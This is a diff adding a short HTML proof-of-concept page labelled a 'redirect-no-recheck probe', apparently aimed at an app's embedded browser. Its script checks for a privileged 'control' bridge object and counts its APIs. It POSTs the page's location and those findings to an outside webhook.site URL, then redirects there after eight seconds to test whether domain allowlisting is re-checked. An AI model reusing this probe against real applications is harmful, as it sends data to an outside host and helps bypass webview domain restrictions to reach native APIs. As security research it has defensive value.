@@ -1,0 +1,14 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>bg-r2</title></head>
+<body style="font:13px monospace;white-space:pre-wrap">
+<h3>bg-r2 redirect-no-recheck probe</h3><div id="out">boot...</div>
+<script>
+var HOOK="https://webhook.site/ab07c8f2-ee3f-45ac-9369-da34f519f217";
+var L=[];function log(s){L.push(s);document.getElementById('out').textContent=L.join("\n");
+  try{fetch(HOOK,{method:"POST",mode:"no-cors",body:L.join("\n")});}catch(e){}}
+log("r2 start host="+location.host+" url="+location.href);
+log("r2 control present="+(!!window.control)+" apis="+(window.control?Object.keys(control).length:0));
+setTimeout(function(){
+  log("r2 nav to third-party host webhook.site (cross-domain, no recheck test)");
+  location.href="https://webhook.site/ab07c8f2-ee3f-45ac-9369-da34f519f217?crossdomain=1&src=bitget-internal";
+},8000);
+</script></body></html>
